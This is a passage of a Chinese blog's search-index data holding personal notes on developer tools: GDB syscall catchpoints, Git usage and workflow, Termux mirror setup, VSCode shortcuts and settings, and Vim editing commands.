write设置write系统调用断点，使用info catch查看文件操作断点。 调试追踪网络操作GDB可以调试追踪网络操作，可以使用catch syscall socket设置socket系统调用断点，使用catch syscall connect设置connect系统调用断点，使用catch syscall accept设置accept系统调用断点，使用catch syscall send设置send系统调用断点，使用catch syscall recv设置recv系统调用断点，使用info catch查看网络操作断点。 调试追踪信号量和共享内存GDB可以调试追踪信号量和共享内存，可以使用catch syscall semop设置semop系统调用断点，使用catch syscall semget设置semget系统调用断点，使用catch syscall semctl设置semctl系统调用断点，使用catch syscall shmget设置shmget系统调用断点，使用catch syscall shmat设置shmat系统调用断点，使用catch syscall shmdt设置shmdt系统调用断点，使用catch syscall shmctl设置shmctl系统调用断点，使用info catch查看信号量和共享内存断点。 调试追踪进程间通信GDB可以调试追踪进程间通信，可以使用catch syscall msgget设置msgget系统调用断点，使用catch syscall msgsnd设置msgsnd系统调用断点，使用catch syscall msgrcv设置msgrcv系统调用断点，使用catch syscall semget设置semget系统调用断点，使用catch syscall semop设置semop系统调用断点，使用catch syscall semctl设置semctl系统调用断点，使用catch syscall shmget设置shmget系统调用断点，使用catch syscall shmat设置shmat系统调用断点，使用catch syscall shmdt设置shmdt系统调用断点，使用catch syscall shmctl设置shmctl系统调用断点，使用info catch查看进程间通信断点。 调试追踪信号处理GDB可以调试追踪信号处理，可以使用catch syscall sigaction设置sigaction系统调用断点，使用catch syscall sigprocmask设置sigprocmask系统调用断点，使用catch syscall sigsuspend设置sigsuspend系统调用断点，使用catch syscall sigreturn设置sigreturn系统调用断点，使用info catch查看信号处理断点。 调试追踪定时器GDB可以调试追踪定时器，可以使用catch syscall timer_create设置timer_create系统调用断点，使用catch syscall timer_settime设置timer_settime系统调用断点，使用catch syscall timer_gettime设置timer_gettime系统调用断点，使用catch syscall timer_delete设置timer_delete系统调用断点，使用info catch查看定时器断点。 调试追踪进程状态GDB可以调试追踪进程状态，可以使用catch syscall wait4设置wait4系统调用断点，使用catch syscall waitpid设置waitpid系统调用断点，使用catch syscall waitid设置waitid系统调用断点，使用catch syscall exit设置exit系统调用断点，使用catch syscall _exit设置_exit系统调用断点，使用catch syscall kill设置kill系统调用断点，使用info catch查看进程状态断点。 调试追踪信号量和共享内存GDB可以调试追踪信号量和共享内存，可以使用catch syscall semop设置semop系统调用断点，使用catch syscall semget设置semget系统调用断点，使用catch syscall semctl设置semctl系统调用断点，使用catch syscall shmget设置shmget系统调用断点，使用catch syscall shmat设置shmat系统调用断点，使用catch syscall shmdt设置shmdt系统调用断点，使用catch syscall shmctl设置shmctl系统调用断点，使用info catch查看信号量和共享内存断点。 调试追踪进程间通信GDB可以调试追踪进程间通信，可以使用catch syscall msgget设置msgget系统调用断点，使用catch syscall msgsnd设置msgsnd系统调用断点，使用catch syscall msgrcv设置msgrcv系统调用断点，使用catch syscall semget设置semget系统调用断点，使用catch syscall semop设置semop系统调用断点，使用catch syscall semctl设置semctl系统调用断点，使用catch syscall shmget设置shmget系统调用断点，使用catch syscall shmat设置shmat系统调用断点，使用catch syscall shmdt设置shmdt系统调用断点，使用catch syscall shmctl设置shmctl系统调用断点，使用info catch查看进程间通信断点。","link":"/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/GDB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"Git学习笔记","text":"安装12sudo apt install git -y # ubuntu, etc.sudo pacman -S git # arch linux Windows从官网下载exe安装，一路下一步即可。或者如果是Win10/11的话可以打开PowerShell执行下面的指令： 1winget install git.git 配置Git的配置文件有两种，全局配置文件，和相对于单个仓库而言的局部配置文件。前者应用于该系统中所有仓库，而后者应用于某个仓库。二者存在冲突项时，以后者优先级为更高。 全局配置文件存在于Linux的~/.gitconfig，或者是Windows的用户目录下的.gitconfig。修改的配置都会储存在这个文件中。而局部配置文件存在于仓库的.git/config中，使用git config编辑，一般不推荐直接编辑。 在Linux中，输入git config后就可以用Tab补全来看到所有可选的选项了。此时修改的，是局部配置；加上--global参数后，修改的就是全局配置。 设置用户名和邮箱 配置第一步，先设置用户名和邮箱。这是创建提交的重要凭据，相当于你给作品的签名。 12git config --global user.name &quot;your name&quot;git config --global user.email &quot;your email&quot; 修改默认编辑器 惯用Vim，感觉默认的Nano用不习惯，所以果断换回Vim： 1git config --global core.editor vim 或者： 1234vim ~/.gitconfig# 修改为如下内容[core] editor=vim 禁用Fast-Forward 关于这是什么和为什么禁用的问题请看后文。 1git config --global merge.ff false 入门 推荐去看《Pro Git》系统学习。 git是重要且强大的版本控制工具。版本控制就相当于Word的历史记录功能，不过远比那强大和可靠。你可以在任何时候，为你当前的修改创建一个commit，它会记录你的仓库中所有文件相对于上个时间点的所有更改记录。 当项目规格急剧增大时，使用版本控制系统(VCS)就是必然的选择：多分支并行开发，代码合并，进度追踪等等，都是保持开发流程井然有序的重要方法。 如果用剧本走向来比喻git，那么git能做到的就是让你能同时尝试所有世界线，并把你喜欢的结局组合到一起。 功能基本上，只要掌握add, commit, push, pull, merge就可以应付日常使用了。对于一些常见问题，使用git help或者在网上寻找答案都是不错的选择。 在介绍功能之前，你可以先去看看Pro Git前几章对Git模型的介绍，包括各种状态的转换，几个空间等。这里简单的介绍下： Git（大体上）有三个区：首先是工作区，它的范围是你文件夹里所有除了.git目录以外的所有文件；其次是暂存区，你更改后使用git add暂存的文件都存储在这里。最后一个区是长期存储区，它保存着你的每一个文件，以及对它的每一次修改历史的原始版本。后两个区都位于.git目录中。也就是说，只要.git目录还在，那么即使你删了仓库里边所有的东西，也能用git恢复所有删除的文件，甚至是你以前的任何一个状态上——就好比玩Gal的时候随时跳转到世界线上的任意一个历史节点。 文件在这三个区域里，也会有不同的状态：在工作区中的文件会呈现出“未跟踪”，或者“已修改”的状态，对它们使用git add filename就能把它们送到暂存区，转变为暂存状态。此时对这些文件做出的任何修改都可以从暂存区恢复，比如不小心删了一段代码又撤销不了，就可以从暂存区恢复这个文件。而暂存区的文件，一旦取消暂存状态，你的这些更改也会跟着消失。这时候，你要是不小心删除了什么还没法撤销的话，就是真丢了。而此时，如果你想把这次更改从暂存区长久保存，就可以使用git commit来“提交”你在暂存区存放的所有文件，它们会被放到长期存储区。而在这之前，git会要求你输入一个提交消息。这个消息是强制的，不能输入空白的消息。虽然有时候麻烦，但是对于以后的版本管理是很便利的：你可以想起来这次提交做了什么修改。输入提交信息后，你的修改就并入长期存储区了。这个时候，你的代码基本上就很安全了。使用git log就能看到你的每一个提交记录。 除了上面说的那些，还有一个最重要的功能没有提到：git分支。git的提交历史就像是一个复杂树状链表结构，每一个提交都指向它的父结点。当你创建提交时，其实你就指定了它的父结点：也就是你这次更改的状态，它就是你的父节点。因此，你可以选择一个节点，将它作为你的父结点，并将你的改动提交的父结点指向它。而如果你指向的父结点已经有了一个子结点，那么这就会创建一个分支（branch），这个分支一般以一个名字标识，范围是从分叉点到这个分支的最新的一次提交记录。这就好比玩Gal时，玩到一半时，回溯到前面的一个结点，选择了另一个选项，从而开启了另一条世界线一样。而与Galgame不同的是，你可以将两个结局“合二为一”，合并为一个新的结局，并开始一段新的可能。基于提交的Git，就能做到将另一个分支的最新提交结点，和当前所在的结点合并，从而产生一个新的结点。一般而言，这个结点会被看作是属于当前分支的：例如，把develop分支合并到当前所在的master分支，产生的用于merge的提交记录就属于master分支。这样的分支模型是git设计的最大魅力之一。 基于git的分支系统，就诞生了使用分支进行开发的最佳实践，也就是git工作流。具体而言就是约定了几个用来完成特定工作的git分支，并严格规定了分支之间的操作准则。 Commit这是git的基础操作之一，在使用之前，先使用git add将要提交的文件加入暂存区。最简单的用法就是： 1git commit 然后等待git弹出提交消息编辑器，输入提交消息，完成提交。如果输入了空白消息，git就会取消提交。 Push &amp; Pull推送代码到远程仓库/拉取远程仓库到本地。用于同步本地和云端的代码更改。运行时一般不加啥参数，就是如果目标已经有了更改，可能得加上--merge或者--rebase来处理冲突。 Pull –Rebase vs –Merge假设A和B同时克隆了一个仓库，并各自完成了一些修改。此时A想要推送自己的提交，却发现B已经推送了自己的提交。此时应该怎么做呢？ 两种方法，首先是merge。拉取的时候加上--merge选项，会自动合并你们的提交。如果有冲突，就会在你的合并编辑器里展示出来，待你修改完成后，以一个合并提交的方式提交上去。 其次是rebase。它大致相当于“移花接木“：把你本地做的提交拼接到拉取下来的更改后边。这样产生的提交记录更加简洁。用法就是拉取时加上--rebase参数。 两种方式的选择取决于你们项目的开发规范，以及你的喜好。如果偏爱简洁，你可能更喜欢rebase；如果你追求commit的尽可能详尽，那么merge可能更适合你。 Pull submodule编译thtk的时候发现submodule没拉取，记录一下这玩意怎么拉） 1git submodule update --init --recursive GitHub Pull Request(PR)虽然不属于git的基本操作但还是提一嘴。这是GitHub的一个操作，用于将别的分支合并到一个特定的分支上。它的使用场景通常如下：你想贡献代码给一个开源项目，就先在GitHub上fork他们的仓库，随后在其中完成你的更改，创建提交。最后，发起一个Pull Request，请求目标仓库拉取你仓库的最新提交到它自身。这种合并是可以跨越仓库的，而前提是它们之间得是fork的关系：其他仓库都是这个仓库的fork。满足这个条件之后，就可以在GitHub上新建一个PR，来通过这样的方式贡献你的代码了。 像Linux这样的重量级开源自由软件，就是无数人通过PR之类的操作慢慢构建起来的。甚至现在打开这个页面还能看到Linus天天在Merge PR（笑死 Merge基本用法：假设当前是master分支，你想要将dev分支合并进来： 1git merge dev 如果没有冲突的话，合并就会顺利完成；否则，你需要在合并编辑器里手动处理那些冲突，然后再提交，完成合并。 Fast-Forward就和它的名字一样，它是用于快速跟进的合并功能。一般的merge会生车工一个merge提交，而fast-forward只是让主分支的HEAD指向被merge的分支的HEAD。这样做的好处显而易见：开发进度跟进非常容易，只需要移动一个指针即可，并且节省了git的空间占用开销。缺点却很是问题：当被合并的分支删除后，git的树结构就会被“捋平”——那些fast-forward的点上没有merge生成的commit节点，所有fast-forward之间的连线自然就相当于“断开”的。 因此，Merge时，尽量禁用fast-forward，否则一旦删除分支，就无法再看到那个分支上到底干了什么。这对于代码问题追踪是很不利的因素。因此在开发中，应当尽量禁用fast-forward。 全局禁用的指令如下： 1git config --global --add merge.ff false Branch查看分支信息。 Log查看历史提交记录。可以加一些参数来改变输出格式： --oneline:一个提交只在一行内显示 graph:以提交树状图的形式展示提交记录 我在~/.gitconfig里面加了一个alias： 12[alias] graph = log --oneline --graph 这样就能在仓库里运行git graph在终端查看“图形”版的提交记录了。 Archive打包是个挺好用的功能，能直接把某个节点的文件树打包成压缩包，供分发使用。 1git archive --format=zip --output=master.zip master 上面的指令将master分支最新的commit的目录树打包成master.zip。 TagGit tag是一种用于在Git仓库中标记特定版本的方法。它通常被用来标记重要的里程碑版本或发布版本，以便于在后续的开发或维护过程中快速定位和回溯到这些版本。 Git tag可以被创建并附加到任何一个Git commit对象上，而且可以添加任意多个标签，每个标签都可以添加一个描述信息。 在Git中，有两种类型的tag: lightweight tag和annotated tag。 轻量级标签（Lightweight tag）只是一个指向某个commit的引用，相当于一个不带附加信息的快照。而附注标签（Annotated tag）则是一个独立的Git对象，它除了包含指向某个commit的引用外，还可以包含标签作者、标签日期、描述信息等元数据。附注标签更适合用于发布版本和重要的里程碑。 要创建一个tag，可以使用git tag命令，例如： 12git tag v1.0.0 # 创建一个名为v1.0.0的轻量级标签git tag -a v1.0.0 -m &quot;Release version 1.0.0&quot; # 创建一个名为v1.0.0的附注标签，同时添加描述信息 要将标签推送到远程仓库，可以使用git push命令，例如： 1git push origin v1.0.0 # 将名为v1.0.0的标签推送到远程仓库 要查看所有标签，可以使用git tag命令，例如： 12git tag # 列出所有标签git tag -l &quot;v1.*&quot; # 列出所有以v1开头的标签 Clone行为是拉取一个远端仓库，但是实际上它的后端是git init和git config——实际上clone命令的行为是创建url同名文件夹，进入其中，执行git init，再借助config设置remote的url为clone的url，最后执行git pull`。 depth1git clone --depth=1 &lt;repo_url&gt; 在clone一些大型仓库时，可以指定depth参数来控制clone的提交记录深度。像上面指定depth为1表示clone下来的仓库只包含最新一次的提交记录。 仓库信息Git中有一些工具，能够便利地查看仓库的信息，比如下面的Bash指令能够以r114.514的格式输出仓库的提交数.Hash值格式的版本号。 1printf &quot;r%s.%s&quot; &quot;$(git rev-list --count HEAD)&quot; &quot;$(git rev-parse --short HEAD)&quot; 规范commit message ref:知乎-猎龙星火 &lt;type&gt;(&lt;scope&gt;): &lt;subject&gt; 提交消息大致描述了本次提交的改动范围，需要有明确的意义。上面的格式是一种比较好的实践。 type：指明commit的类别 feat：新增功能 fix：修复bug docs：文档修改，比如CONTRIBUTING, README等 test：增加/修改测试用例 style：代码格式化，引用包排序等 perf：体验优化，性能、体验、算法等 refactor：代码重构，没有新功能/bug修复 chore：改变构建流程，增加依赖、工具等 revert：版本回滚 merge：代码合并 scope：指明影响范围，比如影响到哪个模块就写上这个模块的名字 subject：关于提交的简短描述，可以附加issue地址，结尾不加标点符号 Git Workflow借助Git来做项目控制，适用于小中规模团队。 通俗来说，是借助Git的分支和合并功能来解决这个问题。每个分支负责特定的任务，通过合并分支来管理工作进度。 分支 main:正式分支，不可push。这个分支的每个版本都是正式可用的版本 develop:团队日常开发的分支，也不能push。 feature/:功能开发分支，在此分支进行功能开发，完成后pr到dev分支并删除该分支。一般一个人负责一个feature/xxx分支，可以push bugfix/:问题修复分支 release/:正式版本分支，创建自main分支，创建后不能合并之后的版本 hotfix/:紧急修复，创建自main/develop support/:版本支持分支 流程一般是开发者们先根据文档，从develop分支fork出来一个feature/xxx分支，随后完成自己的开发后，请求code reviewer来pull自己的分支，并在review之后将自己的分支合并到develop分支上。其中，开发者可以创建bugfix分支来修复问题。 一个版本的开发阶段完成后，就可以由负责人将develop分支merge到main分支，并使用tag打上版本标签来作为一个可供使用的正式版本使用。同时，可以借助GitHub Action等CI/CD工具来自动构建可分发的软件本体。 当遇到用户提出的Issue时，进行bugfix或hotfix，完成后将它merge到main和develop分支。 当出现来比较大的Breaking Changes，并且现在的版本已经足够稳定时，就可以根据版本号的通常语义约定跳到下一个大的版本号进行后续的开发，之前的版本可以创建一个release/vA.B.C分支作为一个稳定的大版本进行长期维护。 这一套工作流程基本上将软件开发细化到了feature的粒度，也细化团队角色到developer和code reviewer这几类。 工具Linux上比较推荐gitflow-avh插件，可以比较方便地按照Git Workflow的方式进行项目管理。具体使用可以去看它的帮助选项，或者看看Tower提供的介绍文档。截至目前，仓库已经Archive了，也不知道为什么。 步骤开发前使用git flow init创建符合Git Workflow的分支结构。 开发时，使用git flow feature/hotfix/release/xxx start &lt;name&gt;来从源分支创建一个新的分支。 开发完成后，先把当前分支merge到develop等分支，然后使用git flow feature/hotfix/xxx finish来完成过当前分支的开发工作，并将它从本地和云端删除。 至于如何删除远端的分支： 12git push origin -d &lt;branch-name&gt; # 删除远程分支git branch -d feature/xxx # 删除本地分支 常见问题终止正在进行的合并 具体报错：Cannot do a soft reset in the middle of a merge解决方案：git reset --merge 错误原因是我们在合并分支时想要取消。我通常是因为在一个设备上commit&amp;push了一些代码，而在另一台设备上已经commit了一些代码，随后打算先pull同步一下再push上去。这时就会提示将pull下来的代码merge到本地仓库中，这时候我一般会merge&amp;push，但是有时候发现不小心把另一个分支的给pull到当前分支了，这时候就需要取消错误的pull操作。然而此时已经进入了merge状态，所以只能先退出这状态再重新正确地同步仓库。 首先，用git stash保存当前的更改，然后git reset --merge退出合并状态。这时再重新正确拉取代码即可。 Linux平台鉴权失败这是因为GitHub现在已经禁用了Git Cli的登录方式。因此我们需要重新配置其他的凭据管理器。比如我使用了git-credential-oauth，这样我就可以跳转到浏览器里登录认证GitHub凭据。配置方法很简单： 12git config --global --unset credential.helpergit-credential-oauth configure 完成后，再执行push时，就会弹出浏览器窗口提示授权GitHub帐号了。 文件上传和下载后，文件名大小写变化git默认设置中，对于文件名的设置是大小写不敏感。因此如果有必要的话，还是把这个设为false来解决问题吧： 12git config --get core.ignorecase # 首先获取当前设置状态，为true则执行下一条指令git config core.ignorecase false # 设置不忽略大小写 拒绝合并无关的历史：？ 今天做数据库大作业的时候，在develop分支写完了前端代码。遂打算merge到main分支，但是收到了这样的警告： 12xeonds@ark-station-breeze:~/Desktop/db-lab$ git merge develop 致命错误：拒绝合并无关的历史 然后就蒙圈了。主要是因为我明明记得我develop分支是从main分支checkout出来的啊……看看历史： 12345678910111213141516171819202122232425# mainxeonds@ark-station-breeze:~/Desktop/db-lab$ git graph * cbed40a (HEAD -&gt; main, origin/main, github/main) initial commit# developxeonds@ark-station-breeze:~/Desktop/db-lab$ git checkout develop 切换到分支 'develop'您的分支与上游分支 'origin/develop' 一致。xeonds@ark-station-breeze:~/Desktop/db-lab$ git graph * 5f244db (HEAD -&gt; develop, origin/develop, github/develop) Completed frontend* 571a5f9 Complete most fetch* a4a6799 Add company api Remove incidential binary file Fix commit box* 22bb06f frontend: a lot* 00d9963 Frontend* 74d0b2e remove unused files* 5da0243 add table for showing data* 3d63881 fix router* 02483ab add router for home &amp; lint fix* 00f4504 Merge branch 'develop' of http://192.168.3.143:3000/xeonds/bus-admin into develop|\\ | * 9ef740e home page completed| * 8073d22 change readme &amp;&amp; add todo| * ba09829 Backend: - api support static fs: for frontend part - config.go: use viper to manage config file - model: conn use config in viper - main: finish init&amp;startup|/ * 57ef7c6 add backend* 45aca82 initial commit 不是这啥情况？怎么都是initial commit结果hash不一样？大概进去看了一下两次提交，内容都是一样的，但是不知道为啥就成这样了。时间紧所以就不详细排查了。总之现在的策略是从develop分支完全merge过来，找了个博客看到了这个问题的解决方法（虽然是拉取时候的，但是合并应该也行）： 1git merge --allow-unrelated-histories develop 解决了。输完上面的指令之后，git就自动回溯了之前的每一次提交，并对每一次提交进行处理，合并initial commit不一致导致的冲突。反正完成之后有好几个main分支的历史提交都被重新修改了（我用的是no rebase策略）。 这应该算是比较罕见的情况了。","link":"/2022/04/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"Termux入坑指北","text":"Termux 0.101(内含数据包)：点击下载。Termux，yyds 换源系装好termux之后，第一步就是这个了。比较推荐的是清华源，稳定且快。 可以使用termux-change-repo指令来在可视化界面手动换源。tuna推荐这种规避风险的方法。 但是我还是习惯第二种。只要复制的时候没漏字符就基本没问题。下面是官方给出的指令。 1234sed -i 's@^\\(deb.*stable main\\)$@#\\1\\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main@' $PREFIX/etc/apt/sources.listsed -i 's@^\\(deb.*games stable\\)$@#\\1\\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/game-packages-24 games stable@' $PREFIX/etc/apt/sources.list.d/game.listsed -i 's@^\\(deb.*science stable\\)$@#\\1\\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/science-packages-24 science stable@' $PREFIX/etc/apt/sources.list.d/science.listapt update &amp;&amp; apt upgrade 复制完，直接丢到termux里，回车，完事。 这里是tuna的termux帮助页面。 配置快捷键和安装常用软件常用软件的话，openssh vim zip tree screen基本就全了？快捷键的话配好了一个，后面丢上来。 这里。 1234bell-character=ignore extra-keys = [ \\['ESC','/','-','HOME','UP','END','PGUP'], \\['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','exit\\r'] \\]","link":"/2021/06/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Termux%E5%85%A5%E5%9D%91%E6%8C%87%E5%8C%97/"},{"title":"VScode使用笔记","text":"毛玻璃效果：Vibrnancy安装Vibrnancy直接在VScode插件市场里搜，安装图里这个就好了。 配置安装完后别急着关。点击卸载旁边的小齿轮，进入扩展设置。 设置里搜vibrancy，回车。按照图片里的设置即可。 完成后，右下角会弹出确认。一路确认即可。 完事儿。 后记 需要注意的一点是，这个插件每次更新VSCode就要重新运行Reload Vibrancy。 如果不起作用，重新启动一下VSCode，应该就好了。 咱现在已经不用这个插件了（返璞归真×还是原皮好看√ 文档比对 打开VSCODE，点击【File】–》【Add Folder to Workspace…】浏览打开要对比文件所在的文件夹。 导入成功后就能看在VSCODE的左侧看到已经将文件导入到工作空间。 按CTRL键选中要对比的两个文件，并右击选择【Compare Selected】开始对比文件。 VSCODE会将两个文件按左右分隔，不一样的地方会红色高亮显示，右侧的状态柱标红色的地方就表示为不同，可以直接点击红色的地方快速查看。 格式化风格配置 ctrl + p 打开 setting.json 输入以下内容保存即可 1&quot;C_Cpp.clang_format_style&quot;: &quot;{ BasedOnStyle: Chromium, IndentWidth: 4}&quot;, 快捷键集锦 折叠/展开当前行 Ctrl+Shift+[/] 文本自动换行 Alt+Zcommand + p 搜索文件command + shift + o 搜索当前文件里的 symbolcommand + t 全局搜索 symbolcommand + f 当前文件文本搜索command + shift + f 全局文本搜索Windows 上把 command 替换成 ctrl 应该就可以。 移动我喜欢用Vim的一个重要原因就是能完全使用键盘就到处移动，没有切换负担。不过因为写前端又开始经常用VSCode了。以前没发现的快捷键现在也偶尔不小心按出来了。别说，加上Vim插件之后还真挺丝滑。 VSCode里边移动的主要问题是各个区域之间的移动。比如主编辑区域，底部终端，左侧快捷栏这几个。左侧的移动可以把鼠标放按钮上边直接看到，比如目录树是ctrl+shift+E，Git是ctrl+shift+G之类的。不过现在侧边提供的功能除了看个文件列表之外我很少用其他的（哎对还有CodeGeeX）。 所以重点是咋在主编辑区域和底栏的终端之间移动。其实很简单，编辑区域使用ctrl+1234...在编辑器的各个分栏之间移动。比如左右分栏的话，使用ctrl+1定位到左边的编辑区域，ctrl+2定位到右边的编辑区域。在一个编辑器选项组中，用alt+1234...切换到对应的待编辑文件。比如左边的分屏里边开了仨文件，就可以用alt+123在这三个里边移动。 移动到下边的编辑器窗口也是用ctrl，不过是ctrl+\\``（就是1左边那个键）。新建终端是ctrl+shift+`。不过和上边比较割裂的是，终端里边不能用alt+1234…的组合键来切换终端。不过，倒是可以用ctrl+shift+5来给终端分屏，然后用alt+左右`来在左边和右边的终端里边切换。 哦刚查了下快捷键，发现其实可以用ctrl+pgup/pgdown切换上一个/下一个终端。这个快捷键也在上面的编辑器组里边可以用。这下操作也算是统一了一点。 然后就是在各个文件里边的移动。第一个方式是借助左侧文件导航栏，第二个方式是在终端里边直接code path/to/filename，这会在当前的编辑器组里边打开这个文件。第三个方式是用ctrl+p打开文件搜索，就跟JetBrains那个按两下shift就跳转到任意文件用法一样，但是速度比前者快一些。 另外就是查找符号定义的方法。这个在阅读源码的时候特别有用，我一般在左边打开那个文件树底下的大纲，然后右边遇到一个想看的函数就f12跳转到定义，或者ctrl+t全局查找符号。或者还饿可以ctrl+shift+f用左边的全局搜索替换来全局搜索，就是记得如果要批量替换什么东西的话，建议先提前做个备份，推荐git。 行尾Windows整烂活非要用那xx的CRLF当行尾标记，所以每次在Windows上GIt commit的时候都会看到Git自己给我们转换行尾格式。不过还好VSCode有默认行尾标记的功能。 在设置里边搜索eol，把它改成\\n就行了（Windows默认是\\r\\n）。这样，文件的默认换行就是\\n了。 或者，在settings.json里边附加这个设置项： 1&quot;files.eol&quot;: &quot;\\n&quot;","link":"/2021/07/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/VScode%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"},{"title":"Vim使用指北","text":"0x0.简介这是一个几乎所有Linux发行版都会自带的，（比较）轻量级的，功能强大的恰到好处的文本编辑器。 因为其功能极度强大，所以人赐外号：“编辑器之神”。 不过，因为它的一切操作只依靠键盘，所以对于用习惯GUI的朋友们而言，不太友好。在谷歌上输入How to quit，联想结果的第一个就是How to quit vim（相对其他几个编辑器而言，它的学习曲线还是比较适中的。初学的时候记下几个快捷键，用熟了再继续慢慢学，不知不觉就能用得越来越爽了。 要想用好Vim，就离不开下面这几个关键点： 快捷键（灵魂） 配置文件（用得更爽） 插件（？） 帮助文档（！），输入:help即可查看 Vim的灵魂是按键操作，而不是花里胡哨的插件。想要用各种插件把Vim打造的媲美IDE的，不妨去试用各种集成Vim的IDE，而不是Vim——你只会浪费时间，很多时候还不会达到目的。 我各种IDE（jb全家桶/VSCode）+Vim插件用的都比较爽。虽然支持的不是很全面，不过只要支持各种语义操作、宏操作以及可视化之类的操作，其实就差不多了。目前体验最好的是VSCode+Vim插件，基本功能支持良好，VSCode Native Integration也做的有可取之处（很多VSCode的重要按键都能映射给VSCode）。Vim已经是一种哲学了。当然如果你是原教旨主义者那随你喜好咯（ 另外，想要真正学习Vim的，建议Vimtutor，并且重点就是学习各种编辑快捷键，以及Vim的编辑器模型设计。 反正我现在原生的Vim使用场景要么是C/C++/Bash之类的主力开发，博客/笔记，要么是其他重量级语言/项目的轻度开发。写博客/写文章这种纯语言的输出挺适合Vim，重度写代码的话，还是自己组合一套合适的工具链完成吧。 0x01.基础操作假定你在用任意一个Linux发行版（Windows需要单独下载），根据下面的步骤来尝试Vim吧。 首先，在命令行中输入vim，进入Vim。也可以输入vim filename来编辑一个现存的文件，或者创建并编辑一个新的文件。 进入Vim后，按键盘上的i以进入编辑模式。此时，最下方的状态指示变为INSERT，即插入模式。这时，我们可以像使用其他文本编辑器一样使用Vim，不过只能用键盘输入、删除和移动光标，并且不能用Ctrl+Z/C/V等组合键，它们不仅没有作用，有的还会终止编辑器使得你丢失编辑进度。 输入完毕后，按一下键盘左上角的Esc，退出编辑模式。随后，输入:（即英文冒号）进入命令模式，此时输入的命令在最底下的状态栏显示。接着，输入wq保存并退出vim。除了用:wq保存并退出，也可以按ESC之后直接输入ZZ(大写)来保存并退出。 这就是Vim的基本使用，现在可以尝试用它进行最基础的文件编辑。 0x02.常用操作与技巧查找替换 查找 首先是单字符查找命令：f命令。它的用法为f{char}，也就是先按f再按要查找的字符。使用;查找下一个字符，使用,查找上一个字符。 其次是查找匹配项。可以使用/pattern来查找。用法很简单，输入/和要匹配的对象的表达式，回车即可。使用n查找下一项，用N查找上一项。 替换 Vi/Vim 中可以使用 :s 命令来替换字符串。以前只会使用一种格式来全文替换，今天发现该命令有很多种写法（vim 真是强大啊，还有很多需要学习的），记录几种在此，方便以后查询。 :s/vivian/sky/ 替换当前行第一个 vivian 为 sky:s/vivian/sky/g 替换当前行所有 vivian 为 sky:n,$s/vivian/sky/ 替换第 n 行开始到最后一行中每一行的第一个 vivian 为 sky:n,$s/vivian/sky/g 替换第 n 行开始到最后一行中每一行所有 vivian 为 sky n 为数字，若 n 为 . 则表示从当前行开始到最后一行 :%s/vivian/sky/（等同于 :g/vivian/s//sky/） 替换每一行的第一个 vivian 为 sky:%s/vivian/sky/g（等同于 :g/vivian/s//sky/g） 替换每一行中所有 vivian 为 sky 替换可以使用&amp;重复，使用u撤销。 或者，可以在普通模式上使用r进行单次替换，使用R/Insert进行多次替换。借助后者，可以进入替换模式。在这模式下，输入任意字符都会替换当前位置的字符。如果替换错误的话，使用Backspace退格取消替换，或者先返回普通模，再按u撤销上次更改即可。 跳转Vim的复杂，一定程度上就是因为跳转功能十分丰富。比如： {和}：跳转到下一个空白行 C-f和C-b：上下滚动屏幕 C-u和C-d：上下滚动半屏 w和e：跳转到下一个词开头/当前词结尾 gh/j/k/l：无视行，在折行中进行上下左右的跳转 *：跳转到下一个和光标下匹配的词 n和N：跳转到下/上一个搜索词 {和}：跳转到上/下一个空行 标记-mark此外还有一个标签（mark）系统可以让你在一个地方插标记传送锚点，然后跳回来。标签记录的位置信息是相对于行而言，而非行号。 用:help mark-motions查看所有帮助。 创建使用m[a-zA-Z]在光标所在处创建标记，其中小写字母创建的标记只在当前缓冲区生效，大写字母的标记则在所有缓冲区生效。 跳转使用'[a-zA-Z]跳转到标记行首个非空字符，''跳转到上个标记行的首个非空字符，\\[a-zA-Z]用于跳转到标记时光标所在的位置，同理也可以使用 `` ` 跳转到上一个标记的光标位置。 查看使用:marks可以查看所有标记，其中也会混入一些系统特殊标记： .最近编辑的位置 0-9最近使用的文件 ^最近插入的位置 '上一次跳转前的位置 &quot;上一次退出文件时的位置 [上一次修改的开始处 ]上一次修改的结尾处 删除标记删除一行会删除这行包含的标记，另外'a这样的标记也可以作为字符实体使用，比如d'a就可以删除标记的行。用:delmarks a b c删除多个标记，:delmarks!删除所有标记。 组合编辑另外有一些命令将一些操作组合到了一起，实现了很多种的编辑方式，比如： s和S：删除当前字符/行并进入编辑模式 cc和C：等价上面的S操作符 J：将下一行的内容拼接到当前行尾 其他的什么oOiIaA暂时懒得写了，因为有个更重要的就是按键组合。比如c$删除到行尾并编辑，caw/a/s/p删除并编辑当前单词/语块/行/段落等，都是很好用的组合编辑命令。 特别注意。上面的组合命令格式类似于动词+名词的结构，给一个可组合动词（反例就是s/S，按下就执行，无法组合）后面加上语义，构成了一种愉快的编辑体验：比手动框选更加精确迅速的编辑模式。 而且上面的操作也可以借助一次移动一次编辑的形式重复化利用，合起来就是编辑高效的秘诀。 Visual模式Vim的使用场景一般都是SSH连接到无头服务器上。那种情况一般没有GUI，也没有鼠标。难道就不能像在Windows里一样用鼠标拖拽选择文字了？仍然可以，借助V模式即可。 V模式，也就是可视化模式，在按ESC退出编辑模式后，按v即可进入。此时，状态栏会显示--VISUAL--，这时用方向键/HJKL移动光标则会从当前位置“拖拽”选择文字，并且此时也一样支持gg/G、:n、n+方向键/HJKL来快速移动光标。此时再按一次v即可退出V模式。 